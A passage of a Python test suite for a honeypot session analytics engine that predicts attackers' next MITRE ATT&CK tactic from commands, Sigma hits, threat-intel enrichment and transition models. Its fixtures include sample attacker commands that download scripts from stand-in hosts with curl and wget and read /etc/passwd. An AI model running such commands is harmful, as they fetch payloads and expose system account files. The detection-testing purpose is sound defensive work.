    assert any("actor_fingerprint_prior.enabled" in error for error in actor_errors)
    assert any("actor_fingerprint_prior.match_fields" in error for error in actor_errors)
    assert any("actor_fingerprint_prior.min_sessions" in error for error in actor_errors)

    invalid_regime = {
        "schema_version": "prediction_policy.v1",
        "policy": {
            "weights": {"fallback_progression": 1.0},
            "behavior_regime_classifier": {
                "enabled": "yes",
                "min_commands": -1,
                "feature_weights": {"command_frequency": -0.5},
            },
        },
    }
    regime_errors = validate_policy_document(invalid_regime)
    assert any("behavior_regime_classifier.enabled" in error for error in regime_errors)
    assert any("behavior_regime_classifier.min_commands" in error for error in regime_errors)
    assert any("behavior_regime_classifier.feature_weights.command_frequency" in error for error in regime_errors)

    trusted = json.loads((Path("configs") / "prediction_policy.trusted.json").read_text(encoding="utf-8"))
    assert validate_policy_document(trusted) == []


def test_trusted_source_and_enrichment_scorers_are_provenance_labeled() -> None:
    features = build_session_features(
        {
            "session_id": "trusted-scorers",
            "src_ip": "198.51.100.45",
            "commands": ["curl http://example.com/payload.sh"],
            "classification_events": [
                {"command": "curl http://example.com/payload.sh", "ttp": "T1059", "tactic": "execution", "confidence": 0.8}
            ],
            "sigma_hits": ["Suspicious curl dropper download"],
            "enrichment_status": {"status": "applied", "providers": ["shodan", "abuseipdb"]},
            "risk_score": 90,
            "is_tor_exit": True,
            "vt_hit": True,
            "vt_detection_ratio": "7/94",
            "infrastructure_tags": ["proxy"],
            "otx_tags": ["malware", "c2"],
            "open_ports": [22, 80],
            "running_services": ["SSH 22/TCP"],
            "shodan_vulns": ["CVE-2024-12345"],
        }
    )
    engine = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.40,
                "sigma_correlation": 0.30,
                "enrichment_context": 0.30,
            },
            "mitre_association_rules": [
                {
                    "rule_id": "unit-tie-prior",
                    "enabled": True,
                    "any_ttps": ["T1059"],
                    "source_type": "human_curated_attck_prior",
                    "provenance": {
                        "method": "manual_review",
                        "basis": ["unit"],
                        "author": "test",
                        "created": "2026-05-20",
                        "version": "1.0",
                    },
                    "evidence_sources": ["MITRE CTID TIE-style association prior"],
                    "references": ["https://github.com/center-for-threat-informed-defense/technique-inference-engine"],
                    "hypotheses": [
                        {
                            "technique": "T1053",
                            "tactic": "persistence",
                            "score": 0.30,
                            "reason": "T1059 association prior suggests persistence review",
                        }
                    ],
                }
            ],
            "sigma_correlation_rules": [
                {
                    "rule_id": "unit-sigma-dropper",
                    "enabled": True,
                    "sigma_contains_any": ["dropper"],
                    "source_type": "detection_correlation",
                    "evidence_sources": ["Sigma downloader/dropper correlation"],
                    "references": ["https://sigmahq.io/"],
                    "hypotheses": [
                        {
                            "technique": "T1105",
                            "tactic": "command-and-control",
                            "score": 0.25,
                            "reason": "Sigma dropper context suggests payload staging",
                        }
                    ],
                }
            ],
        }
    )
    snapshot = engine.predict(features, event_id="evt-trusted")
    assert snapshot["scorer_outputs"]["mitre_association"][0]["source_type"] == "human_curated_attck_prior"
    assert snapshot["scorer_outputs"]["sigma_correlation"][0]["source_type"] == "detection_correlation"
    assert snapshot["scorer_outputs"]["sigma_correlation"][0]["metadata"]["temporal_claim"] is False
    assert snapshot["scorer_outputs"]["sigma_correlation"][0]["metadata"]["inference_type"] == "indirect_detection_context"
    assert snapshot["scorer_outputs"]["enrichment_context"][0]["source_type"] == "context_modifier"
    assert snapshot["scorer_outputs"]["enrichment_context"][0]["metadata"]["temporal_claim"] is False
    assert len(snapshot["scorer_outputs"]["enrichment_context"]) >= 2
    assert any(item["tactic"] == "impact" for item in snapshot["scorer_outputs"]["enrichment_context"])
    assert any(
        "MITRE CTID TIE-style association prior" in source.get("evidence_sources", [])
        for item in snapshot["final_ranking"]
        for source in item.get("sources", [])
    )
    assert snapshot["features"]["enrichment_context"]["risk_score"] == 90


def test_technique_to_tactic_aggregation_methods_show_sum_bias() -> None:
    technique_scores = {
        "T1082": {"tactic": "discovery", "score": 0.20},
        "T1033": {"tactic": "discovery", "score": 0.20},
        "T1057": {"tactic": "discovery", "score": 0.20},
        "T1499": {"tactic": "impact", "score": 0.50},
    }
    assert aggregate_technique_to_tactic(technique_scores, "max") == {
        "discovery": 0.20,
        "impact": 0.50,
    }
    assert aggregate_technique_to_tactic(technique_scores, "sum") == {
        "discovery": 0.60,
        "impact": 0.50,
    }
    assert aggregate_technique_to_tactic(technique_scores, "mean") == {
        "discovery": 0.20,
        "impact": 0.50,
    }


def test_sigma_correlation_aggregates_techniques_to_tactics_by_policy() -> None:
    features = build_session_features(
        {
            "session_id": "sigma-aggregation",
            "sigma_hits": ["multi-technique-demo"],
        }
    )
    sigma_rule = {
        "rule_id": "unit-sigma-technique-aggregation",
        "enabled": True,
        "sigma_contains_any": ["multi-technique"],
        "source_type": "detection_correlation",
        "hypotheses": [
            {
                "technique": "T1003",
                "tactic": "credential-access",
                "score": 0.25,
                "reason": "first credential technique matched",
            },
            {
                "technique": "T1552",
                "tactic": "credential-access",
                "score": 0.35,
                "reason": "second credential technique matched",
            },
            {
                "technique": "T1499",
                "tactic": "impact",
                "score": 0.40,
                "reason": "impact technique matched",
            },
        ],
    }
    base_policy = {
        "prediction_mode": "weighted_ensemble_baseline",
        "min_active_scorers": 1,
        "weights": {
            "local_transition": 0.0,
            "external_seed_transition": 0.0,
            "fallback_progression": 0.0,
            "tactic_combination": 0.0,
            "mitre_association": 0.0,
            "sigma_correlation": 1.0,
            "enrichment_context": 0.0,
        },
        "sigma_correlation_rules": [sigma_rule],
    }

    max_snapshot = RealtimePredictionEngine(
        {**base_policy, "technique_to_tactic_aggregation": "max"}
    ).predict(features, event_id="evt-sigma-max")
    assert max_snapshot["prediction"][0] == "impact"
    assert max_snapshot["final_ranking"][0]["score"] == 0.4
    max_metadata = max_snapshot["scorer_outputs"]["sigma_correlation"][0]["metadata"]
    assert max_metadata["technique_to_tactic_aggregation"]["method"] == "max"

    sum_snapshot = RealtimePredictionEngine(
        {**base_policy, "technique_to_tactic_aggregation": "sum"}
    ).predict(features, event_id="evt-sigma-sum")
    assert sum_snapshot["prediction"][0] == "credential-access"
    assert sum_snapshot["final_ranking"][0]["score"] == 0.6
    sum_metadata = sum_snapshot["final_ranking"][0]["sources"][0]["metadata"]
    assert sum_metadata["technique_to_tactic_aggregation"]["input_count"] == 2


def test_vulnerability_risk_scorer_uses_cve_kev_epss_context() -> None:
    features = build_session_features(
        {
            "session_id": "vuln-context",
            "src_ip": "203.0.113.10",
            "commands": ["curl http://exploit.example/CVE-2024-12345.sh"],
            "kev_matches": [{"cve_id": "CVE-2024-12345", "vendorProject": "Unit Test"}],
        }
    )
    engine = RealtimePredictionEngine(
        {
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 1.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 1.0,
            },
            "vulnerability_risk": {
                "enabled": True,
                "epss_scores": {"CVE-2024-12345": 0.91},
            },
        }
    )
    snapshot = engine.predict(features, event_id="evt-vuln")
    assert features["observed_cves"] == ["CVE-2024-12345"]
    assert snapshot["prediction"][0] == "discovery"
    output = snapshot["scorer_outputs"]["vulnerability_risk"][0]
    assert output["source_type"] == "risk_modifier"
    assert output["depends_on_classification"] is False
    assert output["metadata"]["temporal_claim"] is False
    assert "CISA KEV cache" in output["evidence_sources"]
    assert "vulnerability_risk" not in snapshot["active_scorers"]
    assert "vulnerability_risk" not in snapshot["effective_weights"]
    assert all(
        source["name"] != "vulnerability_risk"
        for item in snapshot["final_ranking"]
        for source in item.get("sources", [])
    )
    assert snapshot["risk_annotation"]["active"] is True
    assert snapshot["risk_annotation"]["level"] == "high"
    assert snapshot["risk_annotation"]["metadata"]["max_epss"] == 0.91
    assert snapshot["risk_annotation"]["excluded_from_tactic_ranking"] is True


def test_local_transition_scorer_learns_from_completed_sessions() -> None:
    history = [
        {
            "session_id": "hist-1",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery"},
                {"tactic": "credential-access"},
                {"tactic": "command-and-control"},
            ],
        },
        {
            "session_id": "hist-2",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery"},
                {"tactic": "credential-access"},
                {"tactic": "command-and-control"},
            ],
        },
        {
            "session_id": "hist-3",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery"},
                {"tactic": "credential-access"},
                {"tactic": "persistence"},
            ],
        },
    ]
    model = build_transition_model(history)
    features = build_session_features(
        {
            "session_id": "active-1",
            "src_ip": "8.8.8.8",
            "classification_events": [{"tactic": "credential-access", "ttp": "T1003"}],
        }
    )
    engine = RealtimePredictionEngine(
        {
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_tactic_transition_count": 1,
            "weights": {
                "local_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "enrichment_context": 0.0,
            },
        },
        transition_model=model,
    )
    snapshot = engine.predict(features, event_id="evt-local")
    assert snapshot["prediction"][0] == "command-and-control"
    assert snapshot["final_ranking"][0]["sources"][0]["name"] == "local_transition"
    assert snapshot["final_ranking"][0]["sources"][0]["source_type"] == "empirical_local"
    assert snapshot["final_ranking"][0]["confidence"] == "low"
    assert snapshot["coverage"]["below_minimum"] is False
    assert "2/3 completed transitions" in snapshot["final_ranking"][0]["reasons"][0]


def test_local_transition_scorer_prefers_sequence_prefixes() -> None:
    history = [
        {
            "session_id": "pref-1",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1003", "tactic": "credential-access"},
                {"ttp": "T1105", "tactic": "command-and-control"},
            ],
        },
        {
            "session_id": "pref-2",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1082", "tactic": "discovery"},
                {"ttp": "T1003", "tactic": "credential-access"},
                {"ttp": "T1105", "tactic": "command-and-control"},
            ],
        },
        {
            "session_id": "pref-3",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1003", "tactic": "credential-access"},
                {"ttp": "T1098", "tactic": "persistence"},
            ],
        },
    ]
    model = build_transition_model(history, prefix_max_length=3)
    features = build_session_features(
        {
            "session_id": "active-prefix",
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery", "confidence": 1.0},
                {"ttp": "T1003", "tactic": "credential-access", "confidence": 1.0},
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_prefix_transition_count": 1,
            "min_technique_transition_count": 1,
            "min_tactic_transition_count": 1,
            "prefix_max_length": 3,
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        },
        transition_model=model,
    ).predict(features, event_id="evt-prefix")
    assert snapshot["prediction"][0] == "command-and-control"
    source = snapshot["final_ranking"][0]["sources"][0]
    assert source["metadata"]["transition_type"] == "prefix"
    assert source["metadata"]["transition_context"] == "discovery>credential-access"


def test_primary_transition_mode_prefers_transition_frequency_by_default() -> None:
    history = [
        {
            "session_id": f"primary-history-{index}",
            "is_ended": True,
            "classification_events": [
                {"tactic": "discovery"},
                {"tactic": "execution"},
            ],
        }
        for index in range(2)
    ]
    features = build_session_features(
        {
            "session_id": "primary-active",
            "classification_events": [{"tactic": "discovery", "confidence": 1.0}],
        }
    )

    snapshot = RealtimePredictionEngine(
        {
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_tactic_transition_count": 1,
            "maturity": {"cold_confidence_cap": ""},
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 1.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        },
        transition_model=build_transition_model(history),
    ).predict(features, event_id="evt-primary-transition")

    assert snapshot["prediction_mode"] == "primary_transition_with_fallback"
    assert snapshot["primary_model"] == "transition_frequency"
    assert snapshot["prediction"][0] == "execution"
    assert snapshot["fallback_used"] is False
    assert snapshot["transition_evidence_type"] == "tactic"
    assert snapshot["transition_count"] == 2.0
    assert snapshot["evidence_count"] == 2.0
    assert snapshot["primary_transition"]["selected_source"] == "local_transition"
    assert snapshot["active_scorers"] == ["local_transition"]
    assert snapshot["active_weights"] == {"local_transition": 1.0}
    source = snapshot["final_ranking"][0]["sources"][0]
    assert source["name"] == "local_transition"
    assert source["weighting_method"] == "primary_transition_no_weighted_ensemble"
    assert snapshot["weighted_ensemble_baseline"]["computed"] is True
    assert snapshot["weighted_ensemble_baseline"]["prediction"][0] == "credential-access"


def test_primary_transition_mode_uses_fallback_for_unseen_context() -> None:
    features = build_session_features(
        {
            "session_id": "primary-fallback-active",
            "classification_events": [{"tactic": "discovery", "confidence": 1.0}],
        }
    )

    snapshot = RealtimePredictionEngine(
        {
            "min_sessions_for_local": 1,
            "external_min_sessions": 1,
            "maturity": {"cold_confidence_cap": ""},
            "weights": {
                "local_transition": 1.0,
                "external_seed_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        },
        transition_model=build_transition_model([]),
        external_transition_model=build_transition_model([]),
    ).predict(features, event_id="evt-primary-fallback")

    assert snapshot["prediction_mode"] == "primary_transition_with_fallback"
    assert snapshot["fallback_used"] is True
    assert "no transition-frequency hypotheses" in snapshot["fallback_reason"]
    assert snapshot["primary_transition"]["selected_source"] == "fallback_progression"
    assert snapshot["prediction"][0] == "credential-access"
    assert snapshot["transition_evidence_type"] == ""
    assert snapshot["active_scorers"] == ["fallback_progression"]


def test_weighted_ensemble_is_not_default_prediction_mode() -> None:
    features = build_session_features(
        {
            "session_id": "primary-default-mode",
            "classification_events": [{"tactic": "discovery", "confidence": 1.0}],
        }
    )
    snapshot = RealtimePredictionEngine().predict(features, event_id="evt-default-mode")

    assert snapshot["prediction_mode"] == "primary_transition_with_fallback"
    assert snapshot["fallback_used"] is True
    assert snapshot["weighted_ensemble_baseline"]["computed"] is True


def test_weighted_ensemble_baseline_mode_remains_available() -> None:
    features = build_session_features(
        {
            "session_id": "weighted-baseline-mode",
            "classification_events": [{"tactic": "discovery", "confidence": 1.0}],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_active_scorers": 1,
            "maturity": {"cold_confidence_cap": ""},
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 1.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        }
    ).predict(features, event_id="evt-weighted-baseline")

    assert snapshot["prediction_mode"] == "weighted_ensemble_baseline"
    assert snapshot["primary_model"] == "weighted_ensemble"
    assert snapshot["weighted_ensemble_baseline"]["computed"] is False
    assert snapshot["prediction"][0] == "credential-access"
    assert snapshot["final_ranking"][0]["sources"][0]["name"] == "fallback_progression"


def test_local_transition_model_recency_decay_and_min_support() -> None:
    history = [
        {
            "session_id": "recent",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1105", "tactic": "command-and-control"},
            ],
        },
        {
            "session_id": "older",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1003", "tactic": "credential-access"},
            ],
        },
    ]
    model = build_transition_model(
        history,
        source_name="local_transition",
        source_database="sqlite:///unit.db",
        recency_half_life_sessions=1,
    )
    assert model["source_database"] == "sqlite:///unit.db"
    assert model["recency_decay_half_life_sessions"] == 1.0
    assert model["transitions"]["discovery"]["command-and-control"] == 1.0
    assert model["transitions"]["discovery"]["credential-access"] == 0.5

    features = build_session_features(
        {
            "session_id": "active-recency",
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery", "confidence": 1.0}
            ],
        }
    )
    blocked = RealtimePredictionEngine(
        {
            "min_sessions_for_local": 1,
            "min_transition_count": 2,
            "min_tactic_transition_count": 2,
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 1.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        },
        transition_model=model,
    ).predict(features, event_id="evt-recency-blocked")
    assert blocked["fallback_used"] is True
    assert blocked["primary_transition"]["selected_source"] == "fallback_progression"
    assert blocked["prediction"][0] == "credential-access"

    allowed = RealtimePredictionEngine(
        {
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_tactic_transition_count": 1,
            "min_active_scorers": 1,
            "maturity": {"cold_confidence_cap": ""},
            "weights": {
                "local_transition": 1.0,
                "external_seed_transition": 0.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        },
        transition_model=model,
    ).predict(features, event_id="evt-recency-allowed")
    assert allowed["prediction"][0] == "command-and-control"
    assert allowed["final_ranking"][0]["sources"][0]["metadata"]["transition_support"] == 1.0


def test_external_seed_transition_model_is_separate_from_local_maturity() -> None:
    external_history = [
        {
            "session_id": "seed-1",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1105", "tactic": "command-and-control"},
            ],
        },
        {
            "session_id": "seed-2",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1082", "tactic": "discovery"},
                {"ttp": "T1105", "tactic": "command-and-control"},
            ],
        },
    ]
    external_model = build_transition_model(external_history)
    external_model["schema_version"] = "external_transition_model.v1"
    external_model["source_type"] = "external_cowrie_seed"
    external_model["provenance"] = {
        "source_type": "external_cowrie_seed",
        "dataset_handle": "unit-test/cowrie-seed",
        "training_source": "unit test seed sessions",
    }
    features = build_session_features(
        {
            "session_id": "active-external-seed",
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "external_min_sessions": 1,
            "external_min_transition_count": 1,
            "external_min_tactic_transition_count": 1,
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.0,
                "external_seed_transition": 1.0,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
        },
        transition_model=build_transition_model([]),
        external_transition_model=external_model,
    ).predict(features, event_id="evt-external-seed")

    assert snapshot["model_maturity"]["maturity"] == "cold"
    assert snapshot["external_seed_model"]["enabled"] is True
    assert snapshot["external_seed_model"]["dataset_handle"] == "unit-test/cowrie-seed"
    assert snapshot["prediction"][0] == "command-and-control"
    source = snapshot["final_ranking"][0]["sources"][0]
    assert source["name"] == "external_seed_transition"
    assert source["source_type"] == "external_cowrie_seed"
    assert source["metadata"]["training_source"] == "unit test seed sessions"
    assert source["metadata"]["transition_support_level"] == "low"
    assert "external Cowrie seed history observed" in snapshot["final_ranking"][0]["reasons"][0]


def test_external_seed_weight_decays_as_local_model_matures() -> None:
    local_history = [
        {
            "session_id": f"local-{index}",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1105", "tactic": "command-and-control"},
            ],
        }
        for index in range(3)
    ]
    external_history = [
        {
            "session_id": f"seed-{index}",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1003", "tactic": "credential-access"},
            ],
        }
        for index in range(3)
    ]
    features = build_session_features(
        {
            "session_id": "decay-active",
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "prediction_mode": "weighted_ensemble_baseline",
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_tactic_transition_count": 1,
            "external_min_sessions": 1,
            "external_min_transition_count": 1,
            "external_min_tactic_transition_count": 1,
            "min_active_scorers": 1,
            "maturity": {
                "stable": {"min_usable_sessions": 3, "min_transition_count": 3},
                "warming": {"min_usable_sessions": 2, "min_transition_count": 2},
                "cold_confidence_cap": "",
            },
            "weights": {
                "local_transition": 0.8,
                "external_seed_transition": 0.5,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
            "external_seed_weight_decay": {
                "enabled": True,
                "cold": 1.0,
                "warming": 0.5,
                "stable": 0.2,
            },
        },
        transition_model=build_transition_model(local_history),
        external_transition_model=build_transition_model(external_history, source_name="external_seed_transition"),
    ).predict(features, event_id="evt-decay")
    assert snapshot["model_maturity"]["maturity"] == "stable"
    assert snapshot["external_seed_weight_policy"]["multiplier"] == 0.2
    assert snapshot["effective_weights"]["external_seed_transition"] == 0.1
    assert any(
        source["name"] == "external_seed_transition" and source["effective_weight"] == 0.1
        for item in snapshot["final_ranking"]
        for source in item.get("sources", [])
    )


def test_external_seed_decay_can_use_empirical_shrinkage() -> None:
    local_history = [
        {
            "session_id": f"local-shrink-{index}",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1105", "tactic": "command-and-control"},
            ],
        }
        for index in range(3)
    ]
    external_history = [
        {
            "session_id": f"seed-shrink-{index}",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1003", "tactic": "credential-access"},
            ],
        }
        for index in range(3)
    ]
    features = build_session_features(
        {
            "session_id": "shrink-active",
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        {
            "min_sessions_for_local": 1,
            "min_transition_count": 1,
            "min_tactic_transition_count": 1,
            "external_min_sessions": 1,
            "external_min_transition_count": 1,
            "external_min_tactic_transition_count": 1,
            "min_active_scorers": 1,
            "weights": {
                "local_transition": 0.8,
                "external_seed_transition": 0.5,
                "fallback_progression": 0.0,
                "tactic_combination": 0.0,
                "mitre_association": 0.0,
                "sigma_correlation": 0.0,
                "enrichment_context": 0.0,
                "vulnerability_risk": 0.0,
            },
            "external_seed_weight_decay": {
                "enabled": True,
                "method": "empirical_shrinkage",
                "cold": 1.0,
                "warming": 0.5,
                "stable": 0.2,
                "shrinkage_count_source": "sessions",
                "shrinkage_k": 3,
                "min_multiplier": 0.0,
                "max_multiplier": 1.0,
            },
            "maturity": {"cold_confidence_cap": ""},
        },
        transition_model=build_transition_model(local_history),
        external_transition_model=build_transition_model(external_history, source_name="external_seed_transition"),
    ).predict(features, event_id="evt-shrinkage")
    policy = snapshot["external_seed_weight_policy"]
    assert policy["method"] == "empirical_shrinkage"
    assert policy["local_evidence_count"] == 3
    assert policy["local_interpolation_weight"] == 0.5
    assert policy["multiplier"] == 0.5
    assert policy["effective_weight"] == 0.25
    assert "not Katz backoff" in policy["reason"]
    assert snapshot["effective_weights"]["external_seed_transition"] == 0.25


def test_external_seed_empirical_shrinkage_boundary_behavior() -> None:
    external_history = [
        {
            "session_id": f"seed-boundary-{index}",
            "is_ended": True,
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery"},
                {"ttp": "T1003", "tactic": "credential-access"},
            ],
        }
        for index in range(3)
    ]
    features = build_session_features(
        {
            "session_id": "shrink-boundary-active",
            "classification_events": [
                {"ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
            ],
        }
    )
    policy = {
        "min_sessions_for_local": 1,
        "min_transition_count": 1,
        "min_tactic_transition_count": 1,
        "external_min_sessions": 1,
        "external_min_transition_count": 1,
        "external_min_tactic_transition_count": 1,
        "min_active_scorers": 1,
        "weights": {
            "local_transition": 0.0,
            "external_seed_transition": 1.0,
            "fallback_progression": 0.0,
            "tactic_combination": 0.0,
            "mitre_association": 0.0,
            "sigma_correlation": 0.0,
            "enrichment_context": 0.0,
            "vulnerability_risk": 0.0,
        },
        "external_seed_weight_decay": {
            "enabled": True,
            "method": "empirical_shrinkage",
            "cold": 1.0,
            "warming": 0.5,
            "stable": 0.2,
            "shrinkage_count_source": "transitions",
            "shrinkage_k": 10,
            "min_multiplier": 0.0,
            "max_multiplier": 1.0,
        },
        "maturity": {"cold_confidence_cap": ""},
    }
    external_model = build_transition_model(external_history, source_name="external_seed_transition")

    empty_local_model = build_transition_model([])
    cold_snapshot = RealtimePredictionEngine(
        policy,
        transition_model=empty_local_model,
        external_transition_model=external_model,
    ).predict(features, event_id="evt-shrinkage-boundary-cold")
    cold_policy = cold_snapshot["external_seed_weight_policy"]
    assert cold_policy["local_evidence_count"] == 0
    assert cold_policy["local_interpolation_weight"] == 0
    assert cold_policy["multiplier"] == 1.0
    assert cold_snapshot["effective_weights"]["external_seed_transition"] == 1.0

    large_local_model = build_transition_model([])
    large_local_model["usable_sessions"] = 1000
    large_local_model["transition_count"] = 1000
    large_snapshot = RealtimePredictionEngine(
        policy,
        transition_model=large_local_model,
        external_transition_model=external_model,
    ).predict(features, event_id="evt-shrinkage-boundary-large")
    large_policy = large_snapshot["external_seed_weight_policy"]
    assert large_policy["local_evidence_count"] == 1000
    assert abs(large_policy["local_interpolation_weight"] - 0.990099) < 0.000001
    assert abs(large_policy["multiplier"] - 0.009901) < 0.000001
    assert large_snapshot["effective_weights"]["external_seed_transition"] < 0.01


def test_session_features_include_actor_fingerprint_context() -> None:
    features = build_session_features(
        {
            "session_id": "actor-fp-features",
            "src_ip": "203.0.113.91",
            "hassh": "unit-hassh",
            "ja3": "unit-ja3",
            "commands": ["wget http://example.com/a.sh -O /tmp/a.sh"],
            "classification_events": [
                {
                    "command": "wget http://example.com/a.sh -O /tmp/a.sh",
                    "ttp": "T1105",
                    "tactic": "command-and-control",
                    "confidence": 1.0,
                }
            ],
        }
    )
    fingerprint = features["session_fingerprint"]
    assert fingerprint["hassh_fingerprint"]
    assert fingerprint["ja3_fingerprint"]
    assert fingerprint["command_pattern_hash"]
    assert fingerprint["primary_fingerprint_type"] == "hassh_fingerprint"


def test_actor_fingerprint_transition_scorer_uses_matching_fingerprint_history() -> None:
    history = [
        {
            "session_id": "actor-fp-history-1",
            "src_ip": "203.0.113.11",
            "hassh": "same-tooling",
            "is_ended": True,
            "commands": ["whoami", "cat /etc/passwd", "wget http://example.com/a.sh"],
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "confidence": 1.0},
                {"command": "cat /etc/passwd", "ttp": "T1003", "tactic": "credential-access", "confidence": 1.0},
                {"command": "wget http://example.com/a.sh", "ttp": "T1105", "tactic": "command-and-control", "confidence": 1.0},
            ],
        }
    ]
    policy = {
        "prediction_mode": "weighted_ensemble_baseline",
        "min_active_scorers": 1,
        "weights": {
            "local_transition": 0.0,
            "external_seed_transition": 0.0,
            "actor_fingerprint_transition": 1.0,
            "fallback_progression": 0.0,
            "tactic_combination": 0.0,
            "mitre_association": 0.0,
            "sigma_correlation": 0.0,
            "enrichment_context": 0.0,
            "vulnerability_risk": 0.0,
        },
        "actor_fingerprint_prior": {
            "enabled": True,
            "match_fields": ["hassh_fingerprint"],
            "min_sessions": 1,
            "min_transition_count": 1,
            "min_prefix_transition_count": 1,
            "min_tactic_transition_count": 1,
            "prefix_max_length": 3,
            "smoothing": 0.0,
        },
        "maturity": {"cold_confidence_cap": ""},
    }
    model = build_actor_fingerprint_transition_model(history, policy=policy)
    assert model["schema_version"] == "actor_fingerprint_transition_model.v1"
    assert model["fingerprint_count"] == 1
    assert model["provenance"]["named_actor_attribution"] is False

    features = build_session_features(
        {
            "session_id": "actor-fp-current",
            "src_ip": "198.51.100.12",
            "hassh": "same-tooling",
            "commands": ["whoami"],
            "classification_events": [
                {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "confidence": 1.0}
            ],
        }
    )
    snapshot = RealtimePredictionEngine(
        policy,
        actor_fingerprint_transition_model=model,
    ).predict(features, event_id="evt-actor-fp")

    assert snapshot["actor_fingerprint_model"]["enabled"] is True
    assert snapshot["actor_fingerprint_model"]["fingerprint_count"] == 1
    assert snapshot["prediction"][0] == "credential-access"
    top = snapshot["final_ranking"][0]
    assert top["sources"][0]["name"] == "actor_fingerprint_transition"
    assert top["sources"][0]["source_type"] == "empirical_actor_fingerprint"
    assert top["sources"][0]["metadata"]["matched_fingerprint_type"] == "hassh_fingerprint"
    assert top["sources"][0]["metadata"]["named_actor_attribution"] is False


def test_actor_fingerprint_transition_scorer_is_inactive_without_matching_fingerprint() -> None:
    policy = {
        "prediction_mode": "weighted_ensemble_baseline",
        "min_active_scorers": 1,
        "weights": {
            "local_transition": 0.0,
            "external_seed_transition": 0.0,
            "actor_fingerprint_transition": 1.0,
            "fallback_progression": 0.0,
            "tactic_combination": 0.0,
            "mitre_association": 0.0,
            "sigma_correlation": 0.0,
            "enrichment_context": 0.0,
            "vulnerability_risk": 0.0,
        },
        "actor_fingerprint_prior": {
            "enabled": True,
            "match_fields": ["hassh_fingerprint"],
            "min_sessions": 1,
            "min_transition_count": 1,
